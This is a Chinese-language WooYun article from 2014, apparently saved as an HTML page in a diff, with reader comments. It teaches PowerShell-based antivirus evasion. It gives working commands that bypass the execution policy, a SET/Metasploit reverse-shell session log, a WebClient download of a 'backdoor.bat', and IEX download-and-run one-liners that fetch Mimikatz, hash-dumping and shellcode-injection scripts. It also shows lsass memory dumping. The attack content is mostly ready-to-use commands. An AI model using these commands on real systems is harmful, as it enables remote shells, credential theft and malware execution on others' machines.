@@ -1,0 +1,86 @@
+<main class="main-container ng-scope" ng-view=""><div class="main receptacle post-view ng-scope"><article class="entry ng-scope" ng-controller="EntryCtrl" ui-lightbox=""><header><h1 class="entry-title ng-binding">Powershell tricks::Bypass AV</h1><div class="entry-meta"><a target="_blank" class="author name ng-binding">DM_</a> <span class="bull">·</span> <time title="2014/10/27 10:32" ui-time="" datetime="2014/10/27 10:32" class="published ng-binding ng-isolate-scope">2014/10/27 10:32</time></div></header><section class="entry-content ng-binding" ng-bind-html="postContentTrustedHtml"><p></p><h2>0x00 Powershell 简介</h2><hr><p>Powershell犹如linux下的bash，并且在windows中Powershell可以利用.NET Framework的强大功能，也可以调用windows API，在win7/server 2008以后，powershell已被集成在系统当中。 Powershell强大的功能特性给windows管理带来了极大的便利，同时也更加便于windows下的渗透测试。</p><h2>0x01 PowerShell Execution Policy</h2><hr><p>Powershell脚本默认情况下无法双击或在cmd下执行。在执行时需要通过一些方法绕过该策略。 最简单的方法就是执行powershell.exe附加需要执行的命令，也可以将要执行的脚本直接复制进powershell的窗口。 当然也可以<code>Download and execute</code>，如下面示例中一样。</p><p>如果需要执行ps1文件时，也可以这样：</p><pre><code>PowerShell.exe -ExecutionPolicy Bypass -File .\runme.ps1
+</code></pre><p>不建议使用其他方法全局改变执行策略，如果场景不同可以根据<a href="https://www.netspi.com/blog/entryid/238/15-ways-to-bypass-the-powershell-execution-policy">参考</a>自行选择执行方式。</p><h2>0x02 Reverse the Shell</h2><hr><p>在遇到防护软件时，可以使用powershell执行shellcode返回shell。执行脚本可以用msf生成，也可以用set工具包生成，注意的是msf生成的ps1文件，而set生成的是bat文件。 下面是在set中生成的过程：</p><pre><code>Select from the menu:
+
+   1) Social-Engineering Attacks
+   2) Fast-Track Penetration Testing
+   3) Third Party Modules
+   4) Update the Metasploit Framework
+   5) Update the Social-Engineer Toolkit
+   6) Update SET configuration
+   7) Help, Credits, and About
+
+  99) Exit the Social-Engineer Toolkit
+
+set&gt; 1
+
+..SNIP...
+
+ Select from the menu:
+
+   1) Spear-Phishing Attack Vectors
+   2) Website Attack Vectors
+   3) Infectious Media Generator
+   4) Create a Payload and Listener
+   5) Mass Mailer Attack
+   6) Arduino-Based Attack Vector
+   7) SMS Spoofing Attack Vector
+   8) Wireless Access Point Attack Vector
+   9) QRCode Generator Attack Vector
+  10) Powershell Attack Vectors
+  11) Third Party Modules
+
+  99) Return back to the main menu.
+
+set&gt; 10
+
+The Powershell Attack Vector module allows you to create PowerShell specific attacks. These attacks will allow you to use PowerShell which is available by default in all operating systems Windows Vista and above. PowerShell provides a fruitful  landscape for deploying payloads and performing functions that  do not get triggered by preventative technologies.
+
+   1) Powershell Alphanumeric Shellcode Injector
+   2) Powershell Reverse Shell
+   3) Powershell Bind Shell
+   4) Powershell Dump SAM Database
+
+  99) Return to Main Menu
+
+set:powershell&gt;1
+set&gt; IP address for the payload listener: 192.168.200.159
+set:powershell&gt; Enter the port for the reverse [443]:4444
+[*] Prepping the payload for delivery and injecting alphanumeric shellcode...
+[*] Generating x86-based powershell injection code...
+[*] Finished generating powershell injection bypass.
+[*] Encoded to bypass execution restriction policy...
+[*] If you want the powershell commands and attack, they are exported to /root/.set/reports/powershell/
+set&gt; Do you want to start the listener now [yes/no]: : yes
+
+..SNIP...
+
+[*] Processing /root/.set/reports/powershell/powershell.rc for ERB directives.
+resource (/root/.set/reports/powershell/powershell.rc)&gt; use multi/handler
+resource (/root/.set/reports/powershell/powershell.rc)&gt; set payload windows/meterpreter/reverse_tcp
+payload =&gt; windows/meterpreter/reverse_tcp
+resource (/root/.set/reports/powershell/powershell.rc)&gt; set lport 4444
+lport =&gt; 4444
+resource (/root/.set/reports/powershell/powershell.rc)&gt; set LHOST 0.0.0.0
+LHOST =&gt; 0.0.0.0
+resource (/root/.set/reports/powershell/powershell.rc)&gt; exploit -j
+[*] Exploit running as background job.
+msf exploit(handler) &gt; 
+[*] Started reverse handler on 0.0.0.0:4444 
+[*] Starting the payload handler...
+[*] Sending stage (769024 bytes) to 192.168.200.158
+[*] Meterpreter session 1 opened (192.168.200.159:4444 -&gt; 192.168.200.158:49818) at 2014-10-23 18:17:35 +0800
+
+msf exploit(handler) &gt; sessions 
+
+Active sessions
+===============
+
+  Id  Type                   Information                               Connection
+  --  ----                   -----------                               ----------
+  1   meterpreter x86/win32  WIN-M49V8M0CSH2\server @ WIN-M49V8M0CSH2  192.168.200.159:4444 -&gt; 192.168.200.158:49818 (192.168.200.158)
+</code></pre><p>生成的文件在<code>/root/.set/reports/powershell/</code>下。 其中<code>x86_powershell_injection.txt</code>为bat文件，可以直接改名运行。 在这里有个技巧可以通过powershell一句话直接下载文件。</p><pre><code>powershell (new-object System.Net.WebClient).DownloadFile( 'http://192.168.200.159/backdoor','backdoor.bat')
+</code></pre><p><img alt="enter image description here" img-src="9601b032a5f71a6bd060c1ea5ec49626e6c54617.jpg"></p><p>然后再执行就可以得到meterpreter会话了。</p><p><img alt="enter image description here" img-src="412d2c06b2eca009d09218e435826a9aa109dc71.jpg"></p><p>并且可以正常执行cmd命令、dump hash明文等操作。</p><p><img alt="enter image description here" img-src="730aee5b81772ebc046841fa034402a4b970f2d0.jpg"></p><p><img alt="enter image description here" img-src="b2c4139993a9c781d610f9567e7b888ea97ce328.jpg"></p><h2>0x03 Dump the hash</h2><hr><p>当然在仅仅需要dump hash时，也可以借助powershell来完成。</p><pre><code>powershell IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/samratashok/nishang/master/Gather/Get-PassHashes.ps1');Get-PassHashes
+</code></pre><p><img alt="enter image description here" img-src="0329b448b88f9cb67a4406933d28e334056e0223.jpg"></p><h2>0x04 Dump the plain Password</h2><hr><p>同样也可以用下面的方式(执行powershell版的Mimikatz)获取明文。</p><pre><code>powershell IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/mattifestation/PowerSploit/master/Exfiltration/Invoke-Mimikatz.ps1'); Invoke-Mimikatz –DumpCerts
+</code></pre><p><img alt="enter image description here" img-src="266f8ea2795b27288e9a4e110f33a186a945e540.jpg"></p><p>值得注意的是在这里也可以通过Command参数执行Mimikatz命令。</p><h2>0x05 Memory Dumping</h2><hr><p>Powershell也可以完成像procdump一样的工作，获取某个进程的dumps。 这里演示获取lsass.exe的dumps，然后再用Mimikatz从dumps中获取明文。</p><p><img alt="enter image description here" img-src="bfbdaddf0e0b7c8f67df9529e80b5edc3e05edd3.jpg"></p><p>然后将lsass dumps文件下载回来用Mimikatz分析可以得到明文密码。</p><p><img alt="enter image description here" img-src="afc3f0d8db4ef6e9bb31a384640a702b672cad65.jpg"></p><p>当然内存dumps不仅仅可以获取windows密码，往往进程内存中或许会储存其他重要的信息或数据。参考<a href="http://blog.spiderlabs.com/2012/07/pentesting-like-an-eastern-european.html">http://blog.spiderlabs.com/2012/07/pentesting-like-an-eastern-european.html</a>。</p><h2>0x06 Execute the shellcode</h2><hr><p>Powershell由于丰富的扩展功能使得其调用windows API非常方便，所以同样也可以执行shellcode，这一过程如下：</p><pre><code>powershell IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/mattifestation/PowerSploit/master/CodeExecution/Invoke-Shellcode.ps1'); Invoke-Shellcode –help
+</code></pre><p><img alt="enter image description here" img-src="7142ad41627a7d65109c0ca2820d669dd0daf13c.jpg"></p><p>但是在这里有个问题，就是x64下shellcode已有的很少，往往通过网上搜集的shellcode都是x86的。如果直接执行x86的shellcode则会出错。</p><p>不过Invoke-Shellcode.ps1脚本默认是将shellcode注入在powershell.exe进程中，那么便可以用64位系统环境下32位的powershell.exe执行x86的shellcode，过程如下：</p><pre><code>c:\windows\syswow64\WindowsPowerShell\v1.0\powershell.exe IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/mattifestation/PowerSploit/master/CodeExecution/Invoke-Shellcode.ps1'); Invoke-Shellcode -Shellcode 0x90,0x90,0x90 ...
+</code></pre><p><img alt="enter image description here" img-src="d31b93ca60e786c199af81af9328b56a15bb5dad.jpg"></p><p>并且这一过程适用于大部分msfpayload生成的shellcode。当然在windows下执行shellcode也可以用其它的方法，比如<a href="https://github.com/inquisb/shellcodeexec">shellcodeexec</a>。不过这个方法并不能bypass AV。但是大家可以根据源码自行bypass。</p><p>未完待续。</p><p></p></section></article><div class="entry-controls clearfix"><div style="float:left;color:#9d9e9f;font-size:15px"><span>&copy;乌云知识库版权所有 未经许可 禁止转载</span></div></div><div class="yarpp-related"><h3>为您推荐了适合您的技术文章:</h3><ol id="recommandsystem"><li><a href="http://drops.wooyun.org/tips/10556" rel="bookmark" id="re1">Powershell tricks::Code Execution &amp; Process Injection</a></li><li><a href="http://drops.wooyun.org/tips/3473" rel="bookmark" id="re2">Powershell tricks::Powershell Remoting</a></li><li><a href="http://drops.wooyun.org/tips/11989" rel="bookmark" id="re3">Powershell 提权框架-Powerup</a></li><li><a href="http://drops.wooyun.org/tips/8568" rel="bookmark" id="re4">使用powershell Client进行有效钓鱼</a></li></ol></div><div id="comments" class="comment-list clearfix"><div id="comment-list"><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">luom</span> <span class="reply-time">2014-10-28 12:23:44</span></div><p></p><p>https://github.com/luom/PowerSploit<br>https://github.com/luom/PowerUp</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">影子叔的粉丝团</span> <span class="reply-time">2014-10-27 16:18:50</span></div><p></p><p>hi,大家好，我是影子叔的忠实粉丝</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">DM_</span> <span class="reply-time">2014-10-27 16:18:10</span></div><p></p><p>powershell绕AV的思路并不算很新，不过powershell不仅仅是用来绕AV的。<br>当然分享的东西不仅只有这些。</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link"><a class="__cf_email__" href="/cdn-cgi/l/email-protection" data-cfemail="7a29123a1e1537">[email&#160;protected]</a></span> <span class="reply-time">2014-10-27 15:41:25</span></div><p></p><p>文章有点似曾相识，除了有些图片不认识</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">redrain</span> <span class="reply-time">2014-10-27 13:59:04</span></div><p></p><p>前排膜拜dm</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">DM_</span> <span class="reply-time">2014-10-27 11:13:50</span></div><p></p><p>会有的。<br>未完待续啊。</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">Evi1c0de</span> <span class="reply-time">2014-10-27 11:10:46</span></div><p></p><p>好文！赞一个</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">蒙塔基的钢弹</span> <span class="reply-time">2014-10-27 11:07:21</span></div><p></p><p>要是来个powershell的远程执行就好了，看了好多目标都开了5895.。。</p><p></p></div></div></div></div></div></main>
